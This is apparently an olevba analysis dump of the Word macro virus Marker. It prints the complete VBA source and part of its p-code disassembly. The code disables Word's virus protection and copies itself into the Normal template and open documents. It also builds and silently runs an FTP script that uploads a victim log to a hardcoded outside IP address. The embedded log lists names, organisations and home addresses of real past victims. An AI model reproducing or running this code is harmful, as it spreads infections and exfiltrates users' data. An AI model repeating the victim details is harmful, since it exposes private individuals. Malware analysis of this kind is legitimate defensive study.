olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.gb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.gb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub CommandButton1_Click()
 Модуль1.ListOfFonts
End Sub

Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 16385, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 26384, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 09:23:32 AM - Wednesday, 23 Dec 1998
' bcbsa
'



' 12:08:05 PM - Monday, 4 Jan 1999
' ISG
'



' 02:41:37 PM - Tuesday, 5 Jan 1999
' Information Systems Group
'



' 12:49:03 PM - Saturday, 9 Jan 1999
' Mona Sowisky
' CSC Healthcare
' One Embarcadero, Suite 2800
' San Francisco, CA 94111



' 12:42:50 PM - Tuesday, 12 Jan 1999
' p2
'



' 05:10:21 PM - Thursday, 21 Jan 1999
' stevenkl
'



' 03:01:37 PM - Monday, 1 Feb 1999
' Mike Rubini
'



' 03:25:33 PM - Tuesday, 2 Feb 1999
' Marilyn Hoyles
'



' 04:13:43 PM - Thursday, 4 Feb 1999
' Sharon Kirsch
' 16-4111 Arbour Green Drive
' Mississauga, Ontario
' L5L 2Z2



' 04:08:01 PM - Monday, 8 Feb 1999
' Nancy Lyras
' Mr. & Mrs. George Lyras
' 5 Jamieson Court
' Sutton, MA  01590



' 11:21:09 AM - Friday, 12 Feb 1999
' Karen Poirier
' Karen L. Poirier
' 35 Windmill Drive
' Marlboro, MA  01752



' 03:55:49 PM - Tuesday, 16 Feb 1999
' Janice Levenson
'



' 02:23:17 PM - Tuesday, 23 Feb 1999
' Janice Levenson
'



' 05:14:00 PM - Tuesday, 23 Feb 1999
' IBU
'



' 08:25:02 AM - Thursday, 25 Feb 1999
' jzakarin
'



' 10:39:53  - Friday, 5 Mar 1999
' Graham Schultz
' Suite 17, Level 1
' Bridgepoint
' 3 Brady Street
' Mosman NSW 2088
' Australia



' 10:31:00 AM - Friday, 12 Mar 1999
' Richard Dagge
'



' 02:13:41  - jeudi, 15 avr 1999
' Anne Deneyer
'



' 12:39:45  - lundi, 19 avr 1999
' Fidelma Joyce
'



' 11:27:06  - вторник, 20 апр 1999
' Бобров
'



' 10:44:49  - вторник, 27 апр 1999
' Ветлужских
'



' 04:59:32  - Salэ, 29 Haz 1999
' Aylin ZAРRALI
'



' 10:42:41  - пятница, 9 июл 1999
' запад-восток
'



' 06:41:28  - четверг, 23 сен 1999
' Olga Brook
'



' 08:05:18 AM - Saturday, 27 Nov 1999
' xx
'



' 02:08:34  - понедельник, 27 дек 1999
' Albert
'



' 06:44:04  - понедельник, 10 янв 2000
' Albert
'



' 01:58:15  - вторник, 18 янв 2000
' tai
'



' 04:16:14  - четверг, 27 янв 2000
' 1
'



' 02:43:04 PM - суббота, 3 фев 2001
' CONSUCCO BUSINESS SERVICES
'



' 06:34:23 PM - вторник, 8 фев 2000
' Consulco Business Services
'



' 10:43:02  - четверг, 10 фев 2000
' Aram
'



' 12:18:21  - пятница, 10 мар 2000
' Tatyana
'



' 01:22:21  - суббота, 18 мар 2000
' Dmitry Kuryata
'



' 01:00:14  - понедельник, 20 Мар 2000
' Serega
'



' 04:35:35  - понедельник, 27 Мар 2000
' Serega
'



' 03:17:17  - понедельник, 10 апр 2000
' A109_1
'



' 08:08:36  - понедельник, 1 фев 1999
' guest
'



' 09:38:26  - пятница, 12 май 2000
' guest
'



' 02:11:25  - вторник, 23 май 2000
' GUEST
'



' 06:49:28  - четверг, 2 ноя 2000
' GUEST
'



' 05:50:33  - пятница, 3 ноя 2000
' d113_main
'



' 10:08:54  - четверг, 9 ноя 2000
' Voida Ludmila
'



' 06:21:52  - вторник, 5 дек 2000
' A109_1
'



Private Sub Document_New()

End Sub

Private Sub Document_Open()

End Sub
' 08:03:23  - суббота, 9 дек 2000
' Ashihmin Alexandr
'



' 02:04:26  - четверг, 21 дек 2000
' uuu
'



' 07:54:42  - субота, 30 Грг 2000
' A224_1
'



' 10:53:43  - суббота, 6 янв 2001
' User
'



' 06:33:00  - понедельник, 15 янв 2001
' mAn
'



' 09:55:19  - серада, 24 Сту 2001
' Eugen
'



' 09:59:44  - пятница, 16 фев 2001
' Office
'



' 03:44:14  - понедельник, 5 мар 2001
' Secretary
'



' 05:13:40  - понедельник, 24 янв 2005
' xLock - лох!
'


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Marker.gb
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 18025 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #3:
' 	Ld Модуль1 
' 	ArgsMemCall ListOfFonts 0x0000 
' Line #4:
' 	EndSub 
' Line #5:
' Line #6:
' 	FuncDefn (Private Sub Document_Close())
' Line #7:
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' Line #10:
' 	Dim (Const) 
' 	LitStr 0x0014 "<- this is a marker!"
' 	VarDefn Marker
' Line #11:
' Line #12:
' 	QuoteRem 0x0000 0x0011 "Declare Variables"
' Line #13:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #14:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #15:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #16:
' Line #17:
' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #19:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #20:
' Line #21:
' 	Ld Marker 
' 	LitDI2 0x4001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #22:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x6710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #23:
' Line #24:
' Line #25:
' 	QuoteRem 0x0000 0x001E "Switch the VirusProtection OFF"
' Line #26:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #27:
' Line #28:
' Line #29:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #30:
' Line #31:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #32:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #33:
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #34:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #35:
' 	EndIfBlock 
' Line #36:
' Line #37:
' 	Ld LogData 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Ld LogData 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St LogData 
' Line #38:
' Line #39:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #40:
' 	Ld LogFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St LogFile 
' Line #41:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #42:
' 	LitStr 0x0006 "C:\hsf"
' 	Ld LogFile 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	St LogFile 
' Line #43:
' Line #44:
' 	Ld LogFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld LogData 
' 	PrintItemNL 
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #47:
' Line #48:
' 	LitStr 0x000D "c:\netldx.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "o 209.201.88.110"
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "user anonymous"
' 	PrintItemNL 
' Line #51:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "pass itsme@"
' 	PrintItemNL 
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "cd incoming"
' 	PrintItemNL 
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "ascii"
' 	PrintItemNL 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld LogFile 
' 	Concat 
' 	PrintItemNL 
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #57:
' Line #58:
' 	LitStr 0x002A "command.com /c ftp.exe -n -s:c:\netldx.vxd"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #59:
' Line #60:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #61:
' Line #62:
' 	EndIfBlock 
' Line #63:
' Line #64:
' Line #65:
' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #66:
' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #67:
' Line #68:
' Line #69:
' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
' Line #70:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #71:
' Line #72:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #73:
' Line #74:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #75:
' Line #76:
' Line #77:
' 	QuoteRem 0x0004 0x0031 "Write a log file of this NormalTemplate infection"
' Line #78:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #79:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #80:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #81:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	ElseBlock 
' Line #84:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #87:
' Line #88:
' 	LineCont 0x0010 09 00 0E 00 12 00 15 00 1E 00 0E 00 29 00 0E 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x0010 "hh:mm:ss AMPM - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OurCode 
' Line #89:
' Line #90:
' Line #91:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #92:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #93:
' Line #94:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #95:
' Line #96:
' 	EndIfBlock 
' Line #97:
' Line #98:
' Line #99:
' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
' Line #100:
' 	LineCont 0x0008 05 00 05 00 13 00 05 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #101:
' Line #102:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #103:
' Line #104:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #105:
' Line #106:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #107:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #108:
' Line #109:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #110:
' Line #111:
' 	EndIfBlock 
' Line #112:
' Line #113:
' Line #114:
' 	EndIfBlock 
' Line #115:
' Line #116:
' 	EndSub 
' Line #117:
' Line #118:
' 	QuoteRem 0x0000 0x000C " Logfile -->"
' Line #119:
' Line #120:
' 	QuoteRem 0x0000 0x0022 " 09:08:36  - Saturday, 28 Nov 1998"
' Line #121:
' 	QuoteRem 0x0000 0x0007 " SPo0Ky"
' Line #122:
' 	QuoteRem 0x0000 0x000C " Blue Planet"
' Line #123:
' 	QuoteRem 0x0000 0x0000 ""
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' 	QuoteRem 0x0000 0x0024 " 02:50:31 PM - Saturday, 28 Nov 1998"
' Line #128:
' 	QuoteRem 0x0000 0x000D " MARK B. SEAY"
' Line #129:
' 	QuoteRem 0x0000 0x0000 ""
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' 	QuoteRem 0x0000 0x0021 " 08:04:45 AM - Friday, 4 Dec 1998"
' Line #134:
' 	QuoteRem 0x0000 0x0004 " UPS"
' Line #135:
' 	QuoteRem 0x0000 0x0000 ""
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' 	QuoteRem 0x0000 0x0024 " 11:43:35 AM - Thursday, 17 Dec 1998"
' Line #140:
' 	QuoteRem 0x0000 0x0004 " WRO"
' Line #141:
' 	QuoteRem 0x0000 0x0000 ""
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' 	QuoteRem 0x0000 0x0025 " 09:23:32 AM - Wednesday, 23 Dec 1998"
' Line #146:
' 	QuoteRem 0x0000 0x0006 " bcbsa"
' Line #147:
' 	QuoteRem 0x0000 0x0000 ""
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' 	QuoteRem 0x0000 0x0021 " 12:08:05 PM - Monday, 4 Jan 1999"
' Line #152:
' 	QuoteRem 0x0000 0x0004 " ISG"
' Line #153:
' 	QuoteRem 0x0000 0x0000 ""
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' 	QuoteRem 0x0000 0x0022 " 02:41:37 PM - Tuesday, 5 Jan 1999"
' Line #158:
' 	QuoteRem 0x0000 0x001A " Information Systems Group"
' Line #159:
' 	QuoteRem 0x0000 0x0000 ""
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' 	QuoteRem 0x0000 0x0023 " 12:49:03 PM - Saturday, 9 Jan 1999"
' Line #164:
' 	QuoteRem 0x0000 0x000D " Mona Sowisky"
' Line #165:
' 	QuoteRem 0x0000 0x000F " CSC Healthcare"
' Line #166:
' 	QuoteRem 0x0000 0x001C " One Embarcadero, Suite 2800"
' Line #167:
' 	QuoteRem 0x0000 0x0018 " San Francisco, CA 94111"
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' 	QuoteRem 0x0000 0x0023 " 12:42:50 PM - Tuesday, 12 Jan 1999"
' Line #172:
' 	QuoteRem 0x0000 0x0003 " p2"
' Line #173:
' 	QuoteRem 0x0000 0x0000 ""
' Line #174:
' Line #175:
' Line #176:
' Line #177:
' 	QuoteRem 0x0000 0x0024 " 05:10:21 PM - Thursday, 21 Jan 1999"
' Line #178:
' 	QuoteRem 0x0000 0x0009 " stevenkl"
' Line #179:
' 	QuoteRem 0x0000 0x0000 ""
' Line #180:
' Line #181:
' Line #182:
' Line #183:
' 	QuoteRem 0x0000 0x0021 " 03:01:37 PM - Monday, 1 Feb 1999"
' Line #184:
' 	QuoteRem 0x0000 0x000C " Mike Rubini"
' Line #185:
' 	QuoteRem 0x0000 0x0000 ""
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' 	QuoteRem 0x0000 0x0022 " 03:25:33 PM - Tuesday, 2 Feb 1999"
' Line #190:
' 	QuoteRem 0x0000 0x000F " Marilyn Hoyles"
' Line #191:
' 	QuoteRem 0x0000 0x0000 ""
' Line #192:
' Line #193:
' Line #194:
' Line #195:
' 	QuoteRem 0x0000 0x0023 " 04:13:43 PM - Thursday, 4 Feb 1999"
' Line #196:
' 	QuoteRem 0x0000 0x000E " Sharon Kirsch"
' Line #197:
' 	QuoteRem 0x0000 0x001B " 16-4111 Arbour Green Drive"
' Line #198:
' 	QuoteRem 0x0000 0x0015 " Mississauga, Ontario"
' Line #199:
' 	QuoteRem 0x0000 0x0008 " L5L 2Z2"
' Line #200:
' Line #201:
' Line #202:
' Line #203:
' 	QuoteRem 0x0000 0x0021 " 04:08:01 PM - Monday, 8 Feb 1999"
' Line #204:
' 	QuoteRem 0x0000 0x000C " Nancy Lyras"
' Line #205:
' 	QuoteRem 0x0000 0x0018 " Mr. & Mrs. George Lyras"
' Line #206:
' 	QuoteRem 0x0000 0x0011 " 5 Jamieson Court"
' Line #207:
' 	QuoteRem 0x0000 0x0012 " Sutton, MA  01590"
' Line #208:
' Line #209:
' Line #210:
' Line #211:
' 	QuoteRem 0x0000 0x0022 " 11:21:09 AM - Friday, 12 Feb 1999"
' Line #212:
' 	QuoteRem 0x0000 0x000E " Karen Poirier"
' Line #213:
' 	QuoteRem 0x0000 0x0011 " Karen L. Poirier"
' Line #214:
' 	QuoteRem 0x0000 0x0012 " 35 Windmill Drive"
' Line #215:
' 	QuoteRem 0x0000 0x0014 " Marlboro, MA  01752"
' Line #216:
' Line #217:
' Line #218:
' Line #219:
' 	QuoteRem 0x0000 0x0023 " 03:55:49 PM - Tuesday, 16 Feb 1999"
' Line #220:
' 	QuoteRem 0x0000 0x0010 " Janice Levenson"
' Line #221:
' 	QuoteRem 0x0000 0x0000 ""
' Line #222:
' Line #223:
' Line #224:
' Line #225:
' 	QuoteRem 0x0000 0x0023 " 02:23:17 PM - Tuesday, 23 Feb 1999"
' Line #226:
' 	QuoteRem 0x0000 0x0010 " Janice Levenson"
' Line #227:
' 	QuoteRem 0x0000 0x0000 ""
' Line #228:
' Line #229:
' Line #230:
' Line #231:
' 	QuoteRem 0x0000 0x0023 " 05:14:00 PM - Tuesday, 23 Feb 1999"
' Line #232:
' 	QuoteRem 0x0000 0x0004 " IBU"
' Line #233:
' 	QuoteRem 0x0000 0x0000 ""
' Line #234:
' Line #235:
' Line #236:
' Line #237:
' 	QuoteRem 0x0000 0x0024 " 08:25:02 AM - Thursday, 25 Feb 1999"
' Line #238:
' 	QuoteRem 0x0000 0x0009 " jzakarin"
' Line #239:
' 	QuoteRem 0x0000 0x0000 ""
' Line #240:
' Line #241:
' Line #242:
' Line #243:
' 	QuoteRem 0x0000 0x001F " 10:39:53  - Friday, 5 Mar 1999"
' Line #244:
' 	QuoteRem 0x0000 0x000F " Graham Schultz"
' Line #245:
' 	QuoteRem 0x0000 0x0012 " Suite 17, Level 1"
' Line #246:
' 	QuoteRem 0x0000 0x000C " Bridgepoint"
' Line #247:
' 	QuoteRem 0x0000 0x000F " 3 Brady Street"
' Line #248:
' 	QuoteRem 0x0000 0x0010 " Mosman NSW 2088"
' Line #249:
' 	QuoteRem 0x0000 0x000A " Australia"
' Line #250:
' Line #251:
' Line #252:
' Line #253:
' 	QuoteRem 0x0000 0x0022 " 10:31:00 AM - Friday, 12 Mar 1999"
' Line #254:
' 	QuoteRem 0x0000 0x000E " Richard Dagge"
' Line #255:
' 	QuoteRem 0x0000 0x0000 ""
' Line #256:
' Line #257:
' Line #258:
' Line #259:
' 	QuoteRem 0x0000 0x001F " 02:13:41  - jeudi, 15 avr 1999"
' Line #260:
' 	QuoteRem 0x0000 0x000D " Anne Deneyer"
' Line #261:
' 	QuoteRem 0x0000 0x0000 ""
' Line #262:
' Line #263:
' Line #264:
' Line #265:
' 	QuoteRem 0x0000 0x001F " 12:39:45  - lundi, 19 avr 1999"
' Line #266:
' 	QuoteRem 0x0000 0x000E " Fidelma Joyce"
' Line #267:
' 	QuoteRem 0x0000 0x0000 ""
' Line #268:
' Line #269:
' Line #270:
' Line #271:
' 	QuoteRem 0x0000 0x0021 " 11:27:06  - вторник, 20 апр 1999"
' Line #272:
' 	QuoteRem 0x0000 0x0007 " Бобров"
' Line #273:
' 	QuoteRem 0x0000 0x0000 ""
' Line #274:
' Line #275:
' Line #276:
' Line #277:
' 	QuoteRem 0x0000 0x0021 " 10:44:49  - вторник, 27 апр 1999"
' Line #278:
' 	QuoteRem 0x0000 0x000B " Ветлужских"
' Line #279:
' 	QuoteRem 0x0000 0x0000 ""
' Line #280:
' Line #281:
' Line #282:
' Line #283:
' 	QuoteRem 0x0000 0x001E " 04:59:32  - Salэ, 29 Haz 1999"
' Line #284:
' 	QuoteRem 0x0000 0x000E " Aylin ZAРRALI"
